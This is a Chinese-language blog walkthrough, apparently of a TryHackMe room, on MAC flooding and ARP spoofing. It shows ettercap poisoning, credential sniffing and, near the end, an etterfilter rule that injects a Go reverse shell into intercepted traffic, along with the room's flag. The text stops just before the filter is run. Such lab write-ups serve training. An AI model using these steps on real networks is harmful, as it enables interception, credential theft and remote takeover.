@@ -1,0 +1,801 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <link rel="icon" href="https://www.worldisend.com/fluid/img/bd4103da81e4a2b5e1d4d6b28693e70a.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Mosaic Theory">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="在进行渗透测试时，您已经获得了对网络的初始访问权限，并升级了 Linux 机器上的 root 权限。在您例行的操作系统枚举期间，您意识到它是一个双宿主主机，这意味着它连接到两个（或更多）网络。作为好奇的黑客，你决定探索这个网络，看看你是否可以横向移动。 12345678root@eve:~# ip address show eth15: eth1: &lt;BROADCAST,MULTICAST,">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MAC Flooding and ARP Spoofing">
+<meta property="og:url" content="http://example.com/2022/10/06/MAC-Flooding-ARP-Spoofing/index.html">
+<meta property="og:site_name" content="Personal Cloud Note">
+<meta property="og:description" content="在进行渗透测试时，您已经获得了对网络的初始访问权限，并升级了 Linux 机器上的 root 权限。在您例行的操作系统枚举期间，您意识到它是一个双宿主主机，这意味着它连接到两个（或更多）网络。作为好奇的黑客，你决定探索这个网络，看看你是否可以横向移动。 12345678root@eve:~# ip address show eth15: eth1: &lt;BROADCAST,MULTICAST,">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5e9955140ab79a04b28162eb/room-content/f19dfb6c3e6771ba582f1994ca54648a.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220714141743401.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220714154710116.png">
+<meta property="og:image" content="https://www.worldisend.com/img/image-20220714154956670.png">
+<meta property="article:published_time" content="2022-10-06T11:30:34.881Z">
+<meta property="article:modified_time" content="2022-07-14T08:45:53.000Z">
+<meta property="article:author" content="Crazyinside">
+<meta property="article:tag" content="漏洞实验">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://tryhackme-images.s3.amazonaws.com/user-uploads/5e9955140ab79a04b28162eb/room-content/f19dfb6c3e6771ba582f1994ca54648a.png">
+  
+  
+  
+  <title>MAC Flooding and ARP Spoofing - Personal Cloud Note</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"https://www.worldisend.com/fluid/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Crazyinside&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://www.worldisend.com/fluid/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="MAC Flooding and ARP Spoofing"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-10-06 19:30" pubdate>
+          October 6, 2022 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.2k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          52 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">MAC Flooding and ARP Spoofing</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>在进行渗透测试时，您已经获得了对网络的初始访问权限，并升级了 Linux 机器上的 root 权限。在您例行的操作系统枚举期间，您意识到它是一个<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Dual-homed">双宿主</a>主机，这意味着它连接到两个（或更多）网络。作为好奇的黑客，你决定探索这个网络，看看你是否可以横向移动。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@eve:~<span class="hljs-comment"># ip address show eth1</span><br>5: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether c2:20:bf:fd:89:90 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.12.66/24 brd 192.168.12.255 scope global eth1<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::c4d1:b8ff:fe7e:c6df/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>root@eve:~<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>
+
+<p>What is your IP address?</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">192.168.12.64<br></code></pre></td></tr></table></figure>
+
+<p>What’s the network’s CIDR prefix?</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/24<br></code></pre></td></tr></table></figure>
+
+<p>然后扫网段：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@eve:~<span class="hljs-comment"># for i in &#123;1..254&#125;; do (ping -c 1 192.168.12.$&#123;i&#125; | grep &quot;bytes from&quot; | grep -v &quot;Unreachable&quot; &amp;); done;</span><br>64 bytes from 192.168.12.2: icmp_seq=1 ttl=64 time=0.174 ms<br>64 bytes from 192.168.12.1: icmp_seq=1 ttl=64 time=0.140 ms<br>64 bytes from 192.168.12.66: icmp_seq=1 ttl=64 time=0.020 ms<br>root@eve:~<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>
+
+<p>How many other live hosts are there?</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">2<br></code></pre></td></tr></table></figure>
+
+<p>What’s the hostname of the first host (lowest IP address) you’ve found?</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">alice<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5e9955140ab79a04b28162eb/room-content/f19dfb6c3e6771ba582f1994ca54648a.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="img"></p>
+<h6 id="流量嗅探："><a href="#流量嗅探：" class="headerlink" title="流量嗅探："></a>流量嗅探：</h6><p>在简单地扫描这些主机不会帮助我们收集任何有用的信息时，可以进行被动嗅探该网络上的流量：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">tcpdump -<span class="hljs-selector-tag">i</span> eth1<br></code></pre></td></tr></table></figure>
+
+<p>可以查看目标网段是否有流量进过：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@eve:~<span class="hljs-comment"># tcpdump -i eth1</span><br>tcpdump: verbose output suppressed, use -v or -vv <span class="hljs-keyword">for</span> full protocol decode<br>listening on eth1, link-type EN10MB (Ethernet), capture size 262144 bytes<br>06:09:03.898712 IP bob &gt; eve: ICMP <span class="hljs-built_in">echo</span> request, <span class="hljs-built_in">id</span> 65458, <span class="hljs-built_in">seq</span> 614, length 674<br>06:09:03.898746 IP eve &gt; bob: ICMP <span class="hljs-built_in">echo</span> reply, <span class="hljs-built_in">id</span> 65458, <span class="hljs-built_in">seq</span> 614, length 67<br></code></pre></td></tr></table></figure>
+
+<p>以 ASCII 格式打印每个数据包，-w可以将流量保存到指定文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tcpdump -A -i eth1 -w /tmp/tcpdump.pcap<br></code></pre></td></tr></table></figure>
+
+<p>捕获流量大约一分钟，然后获取tcpdump.pcap用Wireshark打开。</p>
+<p>Can you see any traffic from those hosts? (Yay/Nay)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Yay<br></code></pre></td></tr></table></figure>
+
+<p>Who keeps sending packets to eve?</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bob<br></code></pre></td></tr></table></figure>
+
+<p>What type of packets are sent?</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ICMP<br></code></pre></td></tr></table></figure>
+
+<p>获取嗅探的流量信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">scp admin@10.10.50.36:/tmp/tcpdump.pcap .<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://www.worldisend.com/img/image-20220714141743401.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220714141743401"></p>
+<p>What’s the size of their data section? (bytes)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">666<br></code></pre></td></tr></table></figure>
+
+<h6 id="MAC泛洪："><a href="#MAC泛洪：" class="headerlink" title="MAC泛洪："></a>MAC泛洪：</h6><p>如果从流量中无法获取更多信息。可尝试MAC泛洪：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">tcpdump -A -i eth1 -w /tmp/tcpdump2.pcap<br></code></pre></td></tr></table></figure>
+
+<p>再用第二个SSH会话启动：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">macof -<span class="hljs-selector-tag">i</span> eth1<br></code></pre></td></tr></table></figure>
+
+<p>大概30秒后，获取流量文件wireshark打开：</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">scp admin<span class="hljs-variable">@10</span>.<span class="hljs-number">10.50</span>.<span class="hljs-number">36</span><span class="hljs-symbol">:/tmp/tcpdump2</span>.pcap .<br></code></pre></td></tr></table></figure>
+
+<p>What kind of packets is Alice continuously sending to Bob? </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ICMP<br></code></pre></td></tr></table></figure>
+
+<p>What’s the size of their data section? (bytes)</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-number">1337</span><br></code></pre></td></tr></table></figure>
+
+<h6 id="ARP嗅探："><a href="#ARP嗅探：" class="headerlink" title="ARP嗅探："></a>ARP嗅探：</h6><p>比起泛洪，ARP欺骗动静会小很多：</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">ettercap -T -<span class="hljs-selector-tag">i</span> eth1 -M arp<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@eve:~<span class="hljs-comment"># ettercap -T -i eth1 -M arp</span><br><br>ettercap 0.8.3 copyright 2001-2019 Ettercap Development Team<br><br>Listening on:<br>  eth1 -&gt; C2:20:BF:FD:89:90<br>	  192.168.12.66/255.255.255.0<br>	  fe80::c4d1:b8ff:fe7e:c6df/64<br><br>SSL dissection needs a valid <span class="hljs-string">&#x27;redir_command_on&#x27;</span> script <span class="hljs-keyword">in</span> the etter.conf file<br>Ettercap might not work correctly. /proc/sys/net/ipv6/conf/all/use_tempaddr is not <span class="hljs-built_in">set</span> to 0.<br>Privileges dropped to EUID 65534 EGID 65534...<br><br>  34 plugins<br>  42 protocol dissectors<br>  57 ports monitored<br>24609 mac vendor fingerprint<br>1766 tcp OS fingerprint<br>2182 known services<br>Lua: no scripts were specified, not starting up!<br><br>Randomizing 255 hosts <span class="hljs-keyword">for</span> scanning...<br>Scanning the whole netmask <span class="hljs-keyword">for</span> 255 hosts...<br>/ |=&gt;                                                 |   0.39 %<br><br>Thu Jul 14 06:41:35 2022 [872226]<br>  192.168.12.2:0 --&gt; 192.168.12.66:0 | P (0)<br></code></pre></td></tr></table></figure>
+
+<p>Can ettercap establish a MITM in between Alice and Bob? (Yay/Nay)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Nay<br></code></pre></td></tr></table></figure>
+
+<p>Would you expect a different result when attacking hosts without ARP packet validation enabled? (Yay/Nay)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Yay<br></code></pre></td></tr></table></figure>
+
+<p>更换另一台环境：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> &#123;1<span class="hljs-built_in">..</span>254&#125;; <span class="hljs-keyword">do</span> (ping -c 1 192.168.12.<span class="hljs-variable">$&#123;i&#125;</span> | grep <span class="hljs-string">&quot;bytes from&quot;</span> | grep -v <span class="hljs-string">&quot;Unreachable&quot;</span> &amp;); done;<br>64 bytes <span class="hljs-keyword">from</span> 192.168.12.10: <span class="hljs-attribute">icmp_seq</span>=1 <span class="hljs-attribute">ttl</span>=64 <span class="hljs-attribute">time</span>=0.269 ms<br>64 bytes <span class="hljs-keyword">from</span> 192.168.12.20: <span class="hljs-attribute">icmp_seq</span>=1 <span class="hljs-attribute">ttl</span>=64 <span class="hljs-attribute">time</span>=0.276 ms<br>64 bytes <span class="hljs-keyword">from</span> 192.168.12.66: <span class="hljs-attribute">icmp_seq</span>=1 <span class="hljs-attribute">ttl</span>=64 <span class="hljs-attribute">time</span>=0.049 ms<br></code></pre></td></tr></table></figure>
+
+<p>Scan the network on eth1. Who’s there? Enter their IP addresses in ascending order.</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">192.168.12.10</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">12</span>.<span class="hljs-number">20</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">admin@eve:~$ nmap 192.168.12.0/24<br>Starting Nmap 7.80 ( https://nmap.org ) at 2022-07-14 07:38 UTC<br>Nmap scan report <span class="hljs-keyword">for</span> alice (192.168.12.10)<br>Host is up (0.00017s latency).<br>Not shown: 999 closed ports<br>PORT     STATE SERVICE<br>4444/tcp open  krb524<br><br>Nmap scan report <span class="hljs-keyword">for</span> bob (192.168.12.20)<br>Host is up (0.00022s latency).<br>Not shown: 999 closed ports<br>PORT   STATE SERVICE<br>80/tcp open  http<br><br>Nmap scan report <span class="hljs-keyword">for</span> eve (192.168.12.66)<br>Host is up (0.00013s latency).<br>Not shown: 997 closed ports<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>5000/tcp open  upnp<br>5002/tcp open  rfe<br><br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (3 hosts up) scanned <span class="hljs-keyword">in</span> 19.52 seconds<br></code></pre></td></tr></table></figure>
+
+<p>Which machine has an open well-known port?</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">192.168.12.20</span><br></code></pre></td></tr></table></figure>
+
+<p>What is the port number?</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">80<br></code></pre></td></tr></table></figure>
+
+<p>Can you access the content behind the service from your current position? (Nay/Yay)</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">Nay</span><br></code></pre></td></tr></table></figure>
+
+<p>Can you see any meaningful traffic to or from that port passively sniffing on you interface eth1? (Nay/Yay)</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">Nay</span><br></code></pre></td></tr></table></figure>
+
+<p>Now launch the same ARP spoofing attack as in the previous task. Can you see some interesting traffic, now? (Nay/Yay)</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">Yay</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://www.worldisend.com/img/image-20220714154710116.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220714154710116"></p>
+<p>Who is using that service?</p>
+<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">alice</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://www.worldisend.com/img/image-20220714154956670.png" srcset="https://www.worldisend.com/fluid/img/loading.gif" lazyload alt="image-20220714154956670"></p>
+<p>What’s the hostname the requests are sent to?</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">www.server.bob<br></code></pre></td></tr></table></figure>
+
+<p>Which file is being requested?</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">test.txt<br></code></pre></td></tr></table></figure>
+
+<p>What text is in the file?</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ok<br></code></pre></td></tr></table></figure>
+
+<p>Which credentials are being used for authentication? (username:password)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">admin:s3cr3t_P4zz<br></code></pre></td></tr></table></figure>
+
+<p>Now, stop the attack (by pressing q). What is ettercap doing in order to leave its man-in-the-middle position gracefully and undo the poisoning?</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">RE-ARPing the victims<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@eve:~<span class="hljs-comment"># curl -H &quot;Authorization: Basic YWRtaW46czNjcjN0X1A0eno=&quot; http://192.168.12.20/user.txt</span><br>THM&#123;wh0s_<span class="hljs-variable">$n</span>!ff1ng_0ur_cr3ds&#125;<br></code></pre></td></tr></table></figure>
+
+<p>Can you access the content behind that service, now, using the obtained credentials? (Nay/Yay)</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">Yay<br></code></pre></td></tr></table></figure>
+
+<p>What is the user.txt flag?</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">THM&#123;wh0s_<span class="hljs-variable">$n</span>!ff1ng_0ur_cr3ds&#125;<br></code></pre></td></tr></table></figure>
+
+<p>You should also have seen some rather questionable kind of traffic. What kind of remote access (shell) does Alice have on the server?</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">reverse shell<br></code></pre></td></tr></table></figure>
+
+<p>What commands are being executed? Answer in the order they are being executed.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span>, <span class="hljs-built_in">pwd</span>, <span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure>
+
+<p>Which of the listed files do you want?</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">root.txt<br></code></pre></td></tr></table></figure>
+
+<h6 id="ARP操控："><a href="#ARP操控：" class="headerlink" title="ARP操控："></a>ARP操控：</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">https://linux.die.net/man/8/etterfilter<br></code></pre></td></tr></table></figure>
+
+<p>根据流量信息能看到alice在不断的用反向shell执行 whomai pwd ls，其大概思路便是进行流量劫持，将其中的whoami替换为反弹shell的命令，就可以收到一个反向shell连接。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> (ip.proto == TCP &amp;&amp; tcp.src == 4444 &amp;&amp; search(DATA.data, <span class="hljs-string">&quot;whoami&quot;</span>) ) &#123;<br>    <span class="hljs-built_in">log</span>(DATA.data, <span class="hljs-string">&quot;/root/ettercap.log&quot;</span>);<br>    replace(<span class="hljs-string">&quot;whoami&quot;</span>, <span class="hljs-string">&quot;echo &#x27;package main;import\&quot;os/exec\&quot;;import\&quot;net\&quot;;func main()&#123;c,_:=net.Dial(\&quot;tcp\&quot;,\&quot;192.168.12.66:6666\&quot;);cmd:=exec.Command(\&quot;/bin/sh\&quot;);cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()&#125;&#x27; &gt; /tmp/t.go &amp;&amp; go run /tmp/t.go &amp;&quot;</span> );<br>    msg(<span class="hljs-string">&quot;###### ETTERFILTER: substituted &#x27;whoami&#x27; with reverse shell. ######\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>然后开放防火墙端口：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ufw allow <span class="hljs-keyword">in</span> on eth1 from 192.168.12.20 to 192.168.12.66 port 6666 proto tcp<br></code></pre></td></tr></table></figure>
+
+<p>后台监听6666：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -nvlp 6666 &amp;<br></code></pre></td></tr></table></figure>
+
+<p>将ecf文件编译为ef：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">etterfilter whoami.ecf -o whoami.ef<br></code></pre></td></tr></table></figure>
+
+<p>执行：</p>
